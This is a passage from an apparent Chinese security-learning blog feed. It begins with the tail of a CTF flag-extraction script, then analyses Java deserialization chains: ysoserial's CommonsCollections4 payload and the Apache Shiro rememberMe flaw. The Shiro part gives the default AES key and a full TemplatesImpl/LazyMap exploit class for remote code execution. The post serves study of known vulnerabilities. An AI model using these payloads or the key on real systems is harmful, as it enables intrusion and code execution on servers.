class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">    &#125;).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag = re.findall(<span class="string">r&#x27;flag\&#123;.+\&#125;&#x27;</span>, r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>集训</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>Java初步学习Ⅴ</title>
    <url>/2022/06/29/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A4/</url>
    <content><![CDATA[<blockquote>
<p>CC4、shiro……</p>
</blockquote>
<span id="more"></span>

<h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>exp：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections4</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Queue</span>&lt;<span class="title">Object</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">      ConstantTransformer constant = <span class="keyword">new</span> ConstantTransformer(String.class);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// mock method name until armed</span></span><br><span class="line">      Class[] paramTypes = <span class="keyword">new</span> Class[] &#123; String.class &#125;;</span><br><span class="line">      Object[] args = <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;</span><br><span class="line">      InstantiateTransformer instantiate = <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">            paramTypes, args);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// grab defensively copied arrays</span></span><br><span class="line">      paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">      args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line"></span><br><span class="line">      ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123; constant, instantiate &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// create queue with numbers</span></span><br><span class="line">      PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> TransformingComparator(chain));</span><br><span class="line">      queue.add(<span class="number">1</span>);</span><br><span class="line">      queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// swap in values to arm</span></span><br><span class="line">      Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);</span><br><span class="line">      paramTypes[<span class="number">0</span>] = Templates.class;</span><br><span class="line">      args[<span class="number">0</span>] = templates;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> queue;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      PayloadRunner.run(CommonsCollections4.class, args);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码并不难，跑了一遍程序之后可以弹出计算器，那么现在就来分析一下吧</p>
<h4 id="调用栈："><a href="#调用栈：" class="headerlink" title="调用栈："></a>调用栈：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;init&gt;:101, XMLFilterImpl (org.xml.sax.helpers)</span><br><span class="line">&lt;init&gt;:62, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">transform:116, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">transform:32, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">transform:112, ChainedTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:81, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1058, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">deserialize:27, Deserializer (ysoserial)</span><br><span class="line">deserialize:22, Deserializer (ysoserial)</span><br><span class="line">run:38, PayloadRunner (ysoserial.payloads.util)</span><br><span class="line">main:62, CommonsCollections4 (ysoserial.payloads)</span><br></pre></td></tr></table></figure>

<h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p>优先队列类</p>
<p>主要是对队列进行操作，可以序列化</p>
<h4 id="浅析"><a href="#浅析" class="headerlink" title="浅析"></a>浅析</h4><p>因为最外层套的就是<code>PriorityQueue</code>，那就先去看一下<code>PriorityQueue#readObject</code>，在最后会调用到<code>heapify()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>heapify()</code>形成最大堆，调用到<code>siftDownUsingComparator</code>的时候会调用到<code>comparator.compare(x, (E) c)</code>也就是<code>TransformingComparator#compare</code>参数都为1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>TransformingComparator#compare</code>，而在实例化的时候<code>this.transformer</code>的值为<code>ChainedTransformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</span><br><span class="line">    O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>ChainedTransformer#transform</code>方法又会调用到<code>ConstantTransformer</code>和<code>InstantiateTransformer</code>的<code>transform</code>，后面的也和CC3一样了在<code>InstantiateTransformer#transform</code>中将<code>TrAXFilter</code>实例化，并且将payload作为参数传进去，从而<code>TrAXFilter</code>在初始化的时候调用到了<code>TemplatesImpl#newTransformer</code>，这里就回到了之前的<code>TemplatesImpl</code>调用链了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i$ = <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">    Transformer&lt;? <span class="keyword">super</span> T, ? extends T&gt; iTransformer = arr$[i$];</span><br><span class="line">    object = iTransformer.transform(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="和CC3的区别"><a href="#和CC3的区别" class="headerlink" title="和CC3的区别"></a>和CC3的区别</h4><blockquote>
<p>Apache Commons Collections是⼀个著名的辅助开发库，包含了⼀些Java中没有的数据结构和和辅助 ⽅法，不过随着Java 9以后的版本中原⽣库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级 或替代。 在2015年底commons-collections反序列化利⽤链被提出时，Apache Commons Collections有以下两 个分⽀版本： </p>
<ul>
<li><p>commons-collections:commons-collections </p>
</li>
<li><p>org.apache.commons:commons-collections4</p>
</li>
</ul>
</blockquote>
<p>CC2和CC4都不适用依赖为commons-collections3.2.1的环境，依赖已经变成commons-collections4，区别为<code>PriorityQueue</code>类在commons-collections4中可序列化，甚至出现了更多可序列化的<code>Transformer</code></p>
<p>但以前的CC链还是能够用到，但是需要修改，就比如CC6可以使用，但是<code>LazyMap#decorate</code>方法没了直接换成另一个相同操作的方法就好了</p>
<h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><h4 id="shiro是什么"><a href="#shiro是什么" class="headerlink" title="shiro是什么"></a>shiro是什么</h4><p>Apache Shiro 是 Java 的一个安全框架。目前，使用 Apache Shiro 的人越来越多，因为它相当简单，对比 Spring Security，可能没有 Spring Security 做的功能强大，但是在实际工作时可能并不需要那么复杂的东西，所以使用小而简单的 Shiro 就足够了。</p>
<p><img src="https://atts.w3cschool.cn/attachments/image/wk/shiro/1.png" alt="img"></p>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理:"></a>漏洞原理:</h4><blockquote>
<p>为了让浏览器或服务器重 启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字 段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。</p>
</blockquote>
<h4 id="CC攻击shiro"><a href="#CC攻击shiro" class="headerlink" title="CC攻击shiro"></a>CC攻击shiro</h4><p>用P神的Demo，用IDEA部署</p>
<p>发现存在CC依赖（用于反序列化漏洞</p>
<p><img src="https://img-blog.csdnimg.cn/da574f0e4b5e4cbf8fcaacb517b3b5f8.png" alt="image-20220627173631844"></p>
<p>部署好之后登录，如果登录成功并且如果在登录的时候选择了<code>rememberme</code>就会产生cookie记录用户信息，从而导致了反序列化漏洞的出现。意思即因为shiro加密的密钥是固定的，如果我们获取到了密钥然后将我们的payload进行加密，放到<code>rememberme</code>上，shiro就会将我们的payload反序列化</p>
<p><img src="https://img-blog.csdnimg.cn/61040b07e0b84db7af1e0da7067201db.png" alt="image-20220627192116391"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认密钥：</span><br><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure>

<p>在反序列化之前我们可以先去走一遍他是怎么进行加密并放到Cookie上的</p>
<h5 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h5><p>可以全局搜索一下<code>RememberMe</code>，存在一个接口，要实现登陆成功、登陆失败、登出等方法，那么就可以直接去实现这个接口的类</p>
<p><code>AbstractRememberMeManager</code>在登陆成功的时候会判断是否需要<code>Remember</code>，跟进<code>isRememberMe</code>和<code>rememberIdentity</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.forgetIdentity(subject);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isRememberMe(token)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.rememberIdentity(subject, token, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上是会去<code>CookieRememberMeManager</code>，因为这个类毕竟是个抽象类捏，继续看。这里的Token实际上就是记录用户信息，包括：用户名、密码以及是否remember</p>
<p><img src="https://img-blog.csdnimg.cn/95a2403ab7744bb184b4e7e23b44c7ec.png" alt="image-20220627195428748"></p>
<p>然后通过<code>rememberIdentity</code>将用户信息装成字节码，并且进行AES加密</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    <span class="keyword">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.serialize(principals);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = <span class="keyword">this</span>.encrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// private CipherService cipherService = new AesCipherService();</span></span><br></pre></td></tr></table></figure>

<p>而在加密方法中，执行加密，且密钥为默认的<code>kPH+bIxk5D2deZiIxcaaaA==</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">    CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.encrypt(serialized, <span class="keyword">this</span>.getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AbstractRememberMeManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>加密结束之后就会调用到<code>CookieRememberMeManager#rememberSerializedIdentity</code>，实现将cookie设置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="keyword">byte</span>[] serialized)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subject)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            String msg = <span class="string">&quot;Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to set the rememberMe cookie. Returning immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        HttpServletRequest request = WebUtils.getHttpRequest(subject);</span><br><span class="line">        HttpServletResponse response = WebUtils.getHttpResponse(subject);</span><br><span class="line">        String base64 = Base64.encodeToString(serialized);</span><br><span class="line">        Cookie template = <span class="keyword">this</span>.getCookie();</span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> SimpleCookie(template);</span><br><span class="line">        cookie.setValue(base64);</span><br><span class="line">        cookie.saveTo(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h5><p>试着直接用无限制的CC6 AES加密之后是否可以打通</p>
<p>发生了报错，说是不加载<code>Transform</code>这个类，会报错说明就是在反序列化也就是解析rememberMe的时候出现了问题，试着打断点看看</p>
<p><img src="https://img-blog.csdnimg.cn/30190359151746a5b5392bff812e1be7.png" alt="image-20220627203627520"></p>
<p>因为各种原因，cookie没修改成功，也懒得本地抓包了，那就跟着P神的思路来吧</p>
<p>异常关键是在<code>ClassResolvingObjectInputStream</code>，可以发现报错信息就是从这个类里出来的。</p>
<p><code>resolveClass</code>方法中对类的加载用到是<code>ClassUtils#forName</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassResolvingObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassResolvingObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownClassException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>区别就是前者用的是 org.apache.shiro.util.ClassUtils#forName （实际上内部用到了org.apache.catalina.loader.ParallelWebappClassLoader#loadClass ），而后者用的是Java原 生的 Class.forName 。</p>
<p>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。</p>
</blockquote>
<h5 id="TemplateImpl-Attack"><a href="#TemplateImpl-Attack" class="headerlink" title="TemplateImpl Attack"></a>TemplateImpl Attack</h5><p>P神的exp：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollectionsShiro</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] getPayload(<span class="keyword">byte</span>[] clazzBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getClass&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, obj);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.clear();</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// 生成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>学习CC3的时候学到的TemolateImpl</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;null&quot;</span>); <span class="comment">// 不为空就好 无要求</span></span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl()); <span class="comment">// defineTransletClasses方法中会存在调用 防止报错</span></span><br></pre></td></tr></table></figure>

<p>而在利用<code>TemplatesImpl</code>的时候，还是用到了<code>Transformer</code>数组，其中第一个元素为<code>ConstantTransformer</code>主要是用来实例化<code>TrAXFilter</code>，因为在这个类的初始化的时候会调用到<code>TemplatesImpl#newTransformer</code>从而完成整个Gadget</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">           <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">           <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">                 <span class="keyword">new</span> Class[] &#123; Templates.class &#125;,</span><br><span class="line">                 <span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br></pre></td></tr></table></figure>

<p>而在·CC6的链子中会用到<code>TiedMapEntry</code>，用于通过<code>getvalue</code>方法触发<code>LazyMap#get</code>方法，这里也会触发到<code>transform</code>方法，而key则是我们传进去的<code>TemplatesImpl</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用到了<code>InvokeTransform#transform</code>，实现把<code>TemplatesImpl</code>进行实例化，并执行其方法，而这里的<code>this.iMethodName</code>又是我们可控的，所以如果把<code>this.iMethodName</code>赋值为<code>newTransformer</code>不就可以实现RCE了嘛</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

